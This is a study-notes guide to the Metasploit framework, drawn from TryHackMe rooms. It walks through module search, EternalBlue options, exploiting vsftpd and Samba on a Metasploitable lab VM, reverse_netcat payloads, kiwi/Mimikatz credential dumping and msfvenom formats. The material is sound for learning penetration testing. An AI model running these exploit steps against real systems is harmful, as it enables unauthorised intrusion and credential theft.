# Metasploit

This part is based on info from the [TryHackMe Metasploit room](https://tryhackme.com/room/rpmetasploit) with some additional information I have added.

Metasploit is a framework for testing and abusing know vulnerabilities.

## Table of Contents

- [Basics](#basics)
- [More advanced search](#more-advanced-search)
- [Using nmap in Metasploit](#using-nmap-in-metasploit)
- [Background Information](#background-information)
- [Simple Example](#simple-example)
- [Another Example](#another-example)
- [Searching outside metasploit with searchsploit](#searching-outside-metasploit-with-searchsploit)
- [Interesting modules and other things](#interesting-modules-and-other-things)
- [Interesting Documentation](#interesting-documentation)
  - [On TryHackMe](#on-tryhackme)
- [The metasploit database](#the-metasploit-database)
- [Msfvenom](#msfvenom)

## Basics

**When we want to use Metasploit for the first time since you booted your system, in a console as root users, run:**

    msfdb init

**See `msfdb --help` for more information**

It is very important to initiate the database if you make use Metasploit for the first time since you booted up your computer. Even if you don't initiate the database, `msfconsole` will work but not all features like the `db_nmap` will work. Actually, `msfdb init` will launch the postgresql database.

Once ready, we can start Metasploit

    msfconsole

Check that we are been connected to the database (postgresql). Once Metasploit is launched.

    db_status

To get help in the `msfconsole`, type:

    help

You can actually also use the shortcut key:

    ?

Sometimes, especially when doing audits, it can be mandatory to record everything you have done to prove what you have done, but also to help to debug. For this see the `spool` option. It will give you information on what to do when you just enter `spool` in the console.

To search something:

    search <keywords1 keyword2 keyword3>

For example:

    seach eternal

Which then in return will show you a bunch of stuff:

```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

In this list you see various items, 6 columns in fact:

1. The row (index in fact) number
2. The name of the module, which also tells you for which operating system this applies to.
3. Disclosure date.
4. The rank number. 
5. A check info column. 
6. A short description with usually the version of the concerned program.

To get more information about a module you can use its index number of the full name of the module:

    info 0

or:

    info exploit/windows/smb/ms17_010_eternalblue

Which in turns show you the full description like this for example:

```
       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch: x64
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Average
  Disclosed: 2017-03-14

Provided by:
  Equation Group
  Shadow Brokers
  sleepya
  Sean Dillon <sean.dillon@risksense.com>
  Dylan Davis <dylan.davis@risksense.com>
  thelightcosine
  wvu <wvu@metasploit.com>
  agalway-r7
  cdelafuente-r7
  cdelafuente-r7
  agalway-r7

Available targets:
  Id  Name
  --  ----
  0   Automatic Target
  1   Windows 7
  2   Windows Embedded Standard 7
  3   Windows Server 2008 R2
  4   Windows 8
  5   Windows 8.1
  6   Windows Server 2012
  7   Windows 10 Pro
  8   Windows 10 Enterprise Evaluation

Check supported:
  Yes

Basic options:
  Name           Current Setting  Required  Description
  ----           ---------------  --------  -----------
  RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT          445              yes       The target port (TCP)
  SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
  SMBPass                         no        (Optional) The password for the specified username
  SMBUser                         no        (Optional) The username to authenticate as
  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.

Payload information:
  Space: 2000

Description:
  This module is a port of the Equation Group ETERNALBLUE exploit,
  part of the FuzzBunch toolkit released by Shadow Brokers. There is a
  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is
  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error
  where a DWORD is subtracted into a WORD. The kernel pool is groomed
  so that overflow is well laid-out to overwrite an SMBv1 buffer.
  Actual RIP hijack is later completed in
  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may
  not trigger 100% of the time, and should be run continuously until
  triggered. It seems like the pool will get hot streaks and need a
  cool down period before the shells rain in again. The module will
  attempt to use Anonymous login, by default, to authenticate to
  perform the exploit. If the user supplies credentials in the
  SMBUser, SMBPass, and SMBDomain options it will use those instead.
  On some systems, this module may cause system instability and
  crashes, such as a BSOD or a reboot. This may be more likely with
  some payloads.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0144
  https://nvd.nist.gov/vuln/detail/CVE-2017-0145
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://nvd.nist.gov/vuln/detail/CVE-2017-0148
  https://github.com/RiskSense-Ops/MS17-010
  https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf
  https://www.exploit-db.com/exploits/42030

Also known as:
  ETERNALBLUE
```

Once we found something we want to "use" we specify the use command with the index value or its name: `use <module index-number or full-module-path-name>`. For example:

Example on index number:

    use 0

Same example but with the module name:

    use exploit/windows/smb/ms17_010_eternalblue

Once you started to `use` a module you will see that the prompt change:
```
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

You can also request `info`, like before using the module. In case you forgot the info.

Now before we continue we need to look to the options we need to set for this module. This is always this way for each module you will use. For this just type in `options` which in turn will show you the options:

```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.48     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Before using the exploit, we can also use the build in `netcat` alike `connect` command to see if we can communicate with the host computer. This can be handy to quickly verify if the host is still up and running. By just entering `connect` the console will give you information about the options you need to set before you will be able to connect.

To set an option, use the `set` keyword following by the value you want to provide. For example:

    set LPORT 8080

Setting a variable only live there in the module we are currently using. So if we load / use another module for whatever reason, we loose the settings. Also when we close metasploit, all these variable changes are lost.

Sometimes it's more easy, especially for some variable types such as `RHOST`, `LHOST` to use the global set with `setg`. So that you don't always need to reset that variable.

We can also `get` the variable value with `get`. And `unset` the variable.

Sometimes there are `advanced` options and to list them, you type `advanced`.

```
Module advanced options (exploit/windows/smb/ms17_010_eternalblue):

   Name                    Current Setting                     Required  Description
   ----                    ---------------                     --------  -----------
   CHOST                                                       no        The local client address
   CPORT                                                       no        The local client port
   CheckModule             auxiliary/scanner/smb/smb_ms17_010  yes       Module to check with
   ConnectTimeout          10                                  yes       Maximum number of seconds to establish a TCP connection
   ContextInformationFile                                      no        The information file that contains context information
   DisablePayloadHandler   false                               no        Disable the handler code for the selected payload
   EnableContextEncoding   false                               no        Use transient context when encoding payloads
   GroomAllocations        12                                  yes       Initial number of times to groom the kernel pool.
   GroomDelta              5                                   yes       The amount to increase the groom count by per try. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   MaxExploitAttempts      3                                   yes       The number of times to retry the exploit. Useful as EternalBlue can sometimes require multiple attempts to get a successful execution.
   ProcessName             spoolsv.exe                         yes       Process to inject payload into.
   Proxies                                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   SSL                     false                               no        Negotiate SSL/TLS for outgoing connections
   SSLCipher                                                   no        String for SSL cipher - "DHE-RSA-AES256-SHA" or "ADH"
   SSLVerifyMode           PEER                                no        SSL verification method (Accepted: CLIENT_ONCE, FAIL_IF_NO_PEER_CERT, NONE, PEER)
   SSLVersion              Auto                                yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)
   VERBOSE                 false                               no        Enable detailed status messages
   WORKSPACE                                                   no        Specify the workspace for this module
   WfsDelay                5                                   no        Additional delay in seconds to wait for a session


Payload advanced options (windows/x64/meterpreter/reverse_tcp):

   Name                         Current Setting  Required  Description
   ----                         ---------------  --------  -----------
   AutoLoadStdapi               true             yes       Automatically load the Stdapi extension
   AutoRunScript                                 no        A script to run automatically on session creation.
   AutoSystemInfo               true             yes       Automatically capture system information on initialization.
   AutoUnhookProcess            false            yes       Automatically load the unhook extension and unhook the process
   AutoVerifySessionTimeout     30               no        Timeout period to wait for session validation to occur, in seconds
   EnableStageEncoding          false            no        Encode the second stage payload
   EnableUnicodeEncoding        false            yes       Automatically encode UTF-8 strings as hexadecimal
   HandlerSSLCert                                no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
   InitialAutoRunScript                          no        An initial script to run on session creation (before AutoRunScript)
   PayloadProcessCommandLine                     no        The displayed command line that will be used by the payload
   PayloadUUIDName                               no        A human-friendly name to reference this unique payload (requires tracking)
   PayloadUUIDRaw                                no        A hex string representing the raw 8-byte PUID value for the UUID
   PayloadUUIDSeed                               no        A string to use when generating the payload UUID (deterministic)
   PayloadUUIDTracking          false            yes       Whether or not to automatically register generated UUIDs
   PingbackRetries              0                yes       How many additional successful pingbacks
   PingbackSleep                30               yes       Time (in seconds) to sleep between pingbacks
   PrependMigrate               false            yes       Spawns and runs shellcode in new process
   PrependMigrateProc                            no        Process to spawn and run shellcode in
   ReverseAllowProxy            false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
   ReverseListenerBindAddress                    no        The specific IP address to bind to on the local system
   ReverseListenerBindPort                       no        The port to bind to on the local system if different from LPORT
   ReverseListenerComm                           no        The specific communication channel to use for this listener
   ReverseListenerThreaded      false            yes       Handle every connection in a new thread (experimental)
   SessionCommunicationTimeout  300              no        The number of seconds of no activity before this session should be killed
   SessionExpirationTimeout     604800           no        The number of seconds before this session should be forcibly shut down
   SessionRetryTotal            3600             no        Number of seconds try reconnecting for on network failure
   SessionRetryWait             10               no        Number of seconds to wait between reconnect attempts
   StageEncoder                                  no        Encoder to use if EnableStageEncoding is set
   StageEncoderSaveRegisters                     no        Additional registers to preserve in the staged payload if EnableStageEncoding is set
   StageEncodingFallback        true             no        Fallback to no encoding if the selected StageEncoder is not compatible
   StagerRetryCount             10               no        The number of times the stager should retry if the first connect fails
   StagerRetryWait              5                no        Number of seconds to wait for the stager between reconnect attempts
   VERBOSE                      false            no        Enable detailed status messages
   WORKSPACE                                     no        Specify the workspace for this module
```


Before launching your attract (`exploit`) you want to `check` if the target is vulnerable to this attack with: `check`

To launch your attack (`exploit`) you want to use the command: `run` or the alias `exploit`.

Metasploit consists of six core modules that make up the bulk of the tools you will utilize within it. To show them, use the `show` command. Which in turn will give you more information:

[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions

These modules are very interesting, and I will not list them here as this is way too long. But think to:

* `exploit` - These are them we most of the time use. These contains the exploit code.
* `payload` - These are used hands in hands with exploits, which contains the various bits of shellcode we send to have executed following exploitation.
* `auxiliary` - Modules used in scanning and verification if machines are exploitable. This is not the same thing as exploit. For example test for vulnerabilities. For example scan a bunch of sshd servers to test out credentials. This is very useful if you're not allowed to do exploitation. This is very common in vulnerability assessments or red teaming to see where the weak points are without doing the full penetration tests. This also include tools like `db_nmap` to scan open ports. Which is `nmap` into metasploit.
* `encoders` - Commonly used in payload obfuscation, which allows us to modify the "appearance" of our exploit such that we may avoid signature detection.
* `post` -  Post (after) exploitation and is for looting (stealing) and pivoting, when you have root/admin access to dump for example the SAM (password) database.
* `NOP Generators` - For buffer overflow and ROP attacks.

Not every module is loaded in by default, but we can use the `load` command to load them.

## More advanced search

We can also run `help search` to display the filters that can be used with search. For example, we can search by the `CVE year`, `platform name`, or `module type`.

For example:

    search cve:2009 type:exploit platform:-linux

## Using nmap in metasploit

And here is a good example of an auxiliary module like discussed in the previous section.

    db_nmap -sV 10.10.179.162    

You can also add the `-vv` flag to speed up the nmap scan.

Once the scan is done, we can do a lot of neat things by typing it's appropriate command:

* `hosts` - To see the hosts we found. But here in the previous example, we only scanned for one particular host.
* `services` - To see all the `services` the nmap scan detected
* `vulns` - To keep track of the discovered vulnerabilities. This

## Background information

To test out Metasploit, you should better make use of very vulnerable 
programs. For instance the Metasploitable Operating system is especially 
created for this purpose. An Operating system dedicated for learning 
purposes and which has tons of applications installed know to be very 
vulnerable. This is very interesting in learning and using tools to hack 
know vulnerable programs.

So to start with this all, install the Metasploitable virtual machine which 
you can download here:
https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

Once downloaded you can easily configure a virtual machine, by making use 
of `Vmware` or `Virtual box`.

## Simple example

Based on a virtual host machine `Metasploitable 2.0.` which contains a lot 
of known exploitable vulnerabilities.

On the host machine, use `zenmap` and do a `Quick Scan Plus` to discover the 
devices on your network. Once you have found all devices connected to your 
network, you can do an `Intense scan` on the IP of that `Metasploitable` 
virtual machine. In my case, that `0Metasploitable 2.0` virtual machine has the 
ip address `10.0.2.6`.

We will for example see that vsftpd 2.3.4 is installed on the target machine:

    21/tcp   open  ftp         vsftpd 2.3.4

From this point, we should search on Google for each application, and it's 
version number to find out if there are known vulnerabilities.

So doing a little Google search about `vsftpd 2.3.4 vulnerabilities` will 
give us for example this website: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/ which give metasploit 
instructions to gain access to this computer.

So to start with, run Metasploit with as `root` user:

    msfconsole

This will load the Metasploit framework.

    use exploit/unix/ftp/vsftpd_234_backdoor

From this you should always look what options there are for this exploit.

    use options

Then set the remote host ip in the options with:

    set RHOST 10.0.2.6

Start the exploit:

    exploit

Actually it's maybe more wise to use the `run -j` instead of `exploit` as this will run the job in the background and this we have our metasploit console free to do other things. Once you used `run -j`, just press enter once so see back your prompt. Then, we can use the command `jobs` to see what's running. This is especially useful for exploits that stays running for some time.

Then also check with `sessions` and `sessions -i NUMBER_SESSION` to re attach the session.

From now, you are on the remote host, and you have full access on the remote 
host. You can check it with `uname -a` to see the linux version and check 
your user rights with `id`.

    touch /tmp/your-been-hacked

And you can verify on that host machine to check if the file `touch 
/tmp/your-been-hacked` has been created.

## Another example

In this example we will look to the vulnerable version of Samba that is 
installed on that remote computer.

    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

So in the `msfconsole`:

    use exploit/multi/samba/usermap_script

Now show the options that are available for this exploit:

    show options

    set RHOST 10.0.2.6

Payloads are small pieces of code that will be executed when the 
vulnerability has been exploited.

See what available payloads there is available:

    show payloads

*Note that a default payload has been loaded with we started to use this 
`username_script exploit`. Note also that not all payloads actually work.*

To set a different payload, you can use the following command:

    set PAYLOAD payload/cmd/unix/reverse_netcat

Finally, launch the exploit:

    exploit


## Searching outside metasploit with searchsploit

    searchsploit proftpd 1.3.5

## Interesting modules and other things

Search for possible exploits after post exploitation. See the [Ice room on TryHackMe](https://tryhackme.com/room/ice):

    run post/multi/recon/local_exploit_suggester

Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz). Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`. 

    load kiwi

## The metasploit database

`Metasploit` has a database function to simplify project management and avoid possible confusion when setting up parameter values.

`metasploit` use `postgresql` as database backend. However, this database does not start up automatically at boot time of the `Kali` machine. This is for security reasons. In the sense that if your `Kali` machine become a target, the attacker can see that you are running a `postgresql` database (mind nmap).

To start the database (as `root` user):

````commandline
systemctl start postgresql
````

Then you will need to initialize the Metasploit Database using the `msfdb init` command.

````commandline
root@kali:~# msfdb init
[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
root@kali:~# msfconsole
````

Checking the status of the database:

````commandline
msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
````

The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available `workspaces` using the workspace command. 

````commandline
msf5 > workspace -a tryhackme
[*] Added workspace: tryhackme
[*] Workspace: tryhackme
msf5 > workspace
  default
* tryhackme
msf5 > workspace default
[*] Workspace: default
msf5 > workspace
  tryhackme
* default
msf5 > workspace tryhackme
[*] Workspace: tryhackme
msf5 > workspace -h

Usage:

    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r <old> <new>   Rename workspace
    workspace -h               Show this help information

msf5 > 
````

As we have initialised the `Metasploit` database, we have some more help information, but now related to the database, when running the `help` command in `msfconsole`:

````commandline
Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific address or address range
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the default to reconnect on startup
    db_status         Show the current data service status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces
````

Now when using the `db_nmap` function in `msfconsole`, all this information will be stored into the database.

````commandline
msf5 > db_nmap -sV -p- 10.10.110.171
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-29 16:24 UTC
[*] Nmap: Nmap scan report for ip-10-10-110-171.eu-west-1.compute.internal (10.10.110.171)
[*] Nmap: Host is up (0.00090s latency).
[*] Nmap: Not shown: 65530 closed ports
[*] Nmap: PORT     STATE SERVICE     VERSION
[*] Nmap: 21/tcp   open  ftp         ProFTPD 1.3.5e
[*] Nmap: 22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)
[*] Nmap: 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)
[*] Nmap: 8000/tcp open  http        WebFS httpd 1.21
[*] Nmap: MAC Address: 02:E5:B6:5A:26:4D (Unknown)
[*] Nmap: Service Info: Host: IP-10-10-110-171; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 15.61 seconds
msf5 >
````

We can now reach all this information with the `hosts` and `services` commands:

````commandline
msf5 > hosts

Hosts
=====

address        mac                name                                         os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----                                         -------  ---------  -----  -------  ----  --------
10.10.110.171  02:e5:b6:5a:26:4d  ip-10-10-110-171.eu-west-1.compute.internal  Unknown                    device         

msf5 > services
Services
========

host           port  proto  name         state  info
----           ----  -----  ----         -----  ----
10.10.110.171  21    tcp    ftp          open   ProFTPD 1.3.5e
10.10.110.171  22    tcp    ssh          open   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
10.10.110.171  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT
10.10.110.171  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT
10.10.110.171  8000  tcp    http         open   WebFS httpd 1.21

msf5 >
````

The `hosts -h` and `services -h` commands can help you become more familiar with available options. 
Once the host information is stored in the database, you can use the `hosts -R` command to add this value to the `RHOSTS` parameter. 

For example:

````commandline
msf5 auxiliary(scanner/smb/smb_ms17_010) > hosts -R

Hosts
=====

address        mac                name                                         os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----                                         -------  ---------  -----  -------  ----  --------
10.10.110.171  02:e5:b6:5a:26:4d  ip-10-10-110-171.eu-west-1.compute.internal  Unknown                    device         

RHOSTS => 10.10.110.171

msf5 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       10.10.110.171                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/smb/smb_ms17_010) >
````

## Msfvenom

`Msfvenom` will allow you to access all payloads available in the  Metasploit framework. `Msfvenom` allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).

List all payloads (produce a long list):

````commandline
msfvenom -l payloads
````

List all formats:

````commandline
# msfvenom --list formats

Framework Executable Formats [--format <value>]
===============================================

    Name
    ----
    asp
    aspx
    aspx-exe
    axis2
    dll
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    python-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war

Framework Transform Formats [--format <value>]
==============================================

    Name
    ----
    base32
    base64
    bash
    c
    csharp
    dw
    dword
    hex
    java
    js_be
    js_le
    num
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    sh
    vbapplication
    vbscript
````

## Interesting documentation

### On TryHackMe

- https://tryhackme.com/room/rpmetasploit
- https://tryhackme.com/room/ice
